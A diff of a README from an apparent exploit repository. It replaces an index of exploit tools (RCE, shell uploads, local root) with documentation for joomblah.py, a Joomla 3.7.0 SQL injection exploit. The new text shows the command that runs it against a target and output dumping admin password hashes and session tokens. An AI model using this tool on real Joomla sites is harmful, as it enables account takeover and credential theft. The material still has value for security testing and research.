@@ -1,56 +1,45 @@
-# Exploits
-Miscellaneous proof of concept exploit code written at Xiphos Research for testing purposes.
+# Exploit for Joomla 3.7.0 (CVE-2017-8917)
 
-## Current Exploits (index may be out of date)
+Another proof of concept exploit for Joomla, whoop-de-doo, this time a SQL Injection in 3.7.0.
 
-* phpMoAdmin Remote Code Execution (CVE-2015-2208)
-* LotusCMS Remote Code Execution (OSVDB-75095)
-* ElasticSearch Remote Code Execution (CVE-2015-1427)
-* ShellShock (httpd) Remote Code Execution (CVE-2014-6271)
-* IISlap - http.sys Denial of Service/RCE PoC (DoS only). (MS-15-034)
-* se0wned - Seowintech Router diagnostic.cgi remote root
-* WPsh0pwn - Wordpress WPShop eCommerce Shell Upload (WPVDB-7830)
-* nmediapwn - Wordpress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload
-* pwnflow - Wordpress Work the flow file upload 2.5.2 Shell Upload
-* delusions - Wordpress InfusionSoft Gravity Forms Shell Upload (CVE-2014-6446)
-* suiteshell - SuiteCRM Post-Auth Remote Code Execution (CVE-2015-NOTYET)
-* suiteracer - SuiteCRM Post-Auth Remote Code Execution Race Condition (CVE-2015-xxxx)
-* unsanitary - Address Sanitizer + Setuid Binary = Local Root exploit (LD_PRELOAD vector)
-* DiamondFox - DiamondFox Botnet C&C Panel Shell Upload
-* DoubtfullyMalignant - BenignCertain DoS PoC
-* TorCT-Shell - TorCT RAT C&C Panel Shell Upload
-* vBullshit - vBulletin 5.x.x unserialize() Remote Code Execution (CVE-2015-7808)
-* Xanity-Shell - Xanity RAT C&C Panel Shell Upload
-* Joomraa - PoC + upload blacklist bypass (CVE-2016-8869, CVE-2016-8870, CVE-2016-9836)
-* Deathsize - LifeSize Room remote code execution & local root exploit
-* AssetExploder - ManageEngine Asset Explorer remote code execution
-* DroppleGanger - Droppler <= 1.6.5 Auth-Bypass & RCE
-* tr-06fail - TR-064 Misimplementations leading to remote device takeover in ZyXEL Routers
-* screen2root - Screen 4.05.00 (CVE-2017-5618) local privesc
-* FreeACS-Pwn - TR-069 exploit for FreeACS server, disclosed at BSides Edinburgh.
-* Joomblah - Joomla 3.7.0 SQL Injection exploit (CVE-2017-8917)
-* pisspoorpool - Local file inclusion exploit for p2pool status page
-* wipgpwn - Remote Root Exploit for WePresent WiPG-1000,1500,2000 devices
-* dloser - D-Link DNS-320/330/350/x Remote Root Exploit
-* TBA
+ * https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
 
-## Infrequently Asked Questions.
+## Usage
 
-1. Why is there no "leet zerodays" in here?
+Point the joomblah.py script at the vulnerable Joomla 3.7.0 install, it may take some time, but it will dump the users and session tables.
 
-   Because some of our researchers don't believe in killing bugs prematurely, and the unofficial policy on disclosure is that it is at the sole discretion of the person who finds the bug.
-2. Why don't you just write metasploit modules?
+```
+$ python joomblah.py http://127.0.0.1:8080
+                                                                                                                    
+    .---.    .-'''-.        .-'''-.                                                           
+    |   |   '   _    \     '   _    \                            .---.                        
+    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
+    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
+    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
+    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
+    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
+    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
+    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
+    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
+ __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
+|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
+|____.'                                                                `--'  `" '---'   '---' 
 
-   Reasons, namely, "ruby", amongst other things. Also, other people who are actually getting paid by Rapid7 to do such things can do such things :)
-3. Why are there some old bugs in here?
-
-   The public exploits available for them were unreliable/untrustworthy/rubbish and better ones were called for, or, they are parts of ongoing experiments into various methods to make them more reliable/stealthy/whatever.
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: rlbre_users
+  -  Found table: tgukl_users
+  -  Extracting users from rlbre_users
+ [$] Found user ['361', 'Super User', 'admin', 'admin@example.com', '$2y$10$G4ivaKw71R4uIvuHYliSke5pHoh1Q.xm.Sk29d8zpzx4xJBfPoyEK', '', '']
+  -  Extracting sessions from rlbre_session
+ [$] Found session ['361', '3rfv8kql26s6kvimpbchneom85', 'admin']
+  -  Extracting users from tgukl_users
+ [$] Found user ['883', 'Super User', 'admin', 'admin@example.com', '$2y$10$5Za2zpqTdRo5x19cvO5biOKeiyOi2iTQ3u0SSLtcs6uvIvJhvM9aG', '', '']
+  -  Extracting sessions from tgukl_session
+```
 
 ## Licence
-See individual exploits for their respective licences.
 
-## Bug Reports
-We take the quality of our exploit code very seriously. If you find a bug, or an edge case where an exploit fails to succeed against a vulnerable target, do let us know immediately so said situation can be rectified via the bug tracker (issues thing on this repository), or via email/twitter.
+Licenced under the [WTFPL][wtfpl]
 
-## Changes
-There is no changelogs here, as that would be too much effort, just git commits. Exploits may be updated regularly for greater stability, reliability or stealthiness, so check them for updates regularly.
+[wtfpl]: http://www.wtfpl.net/
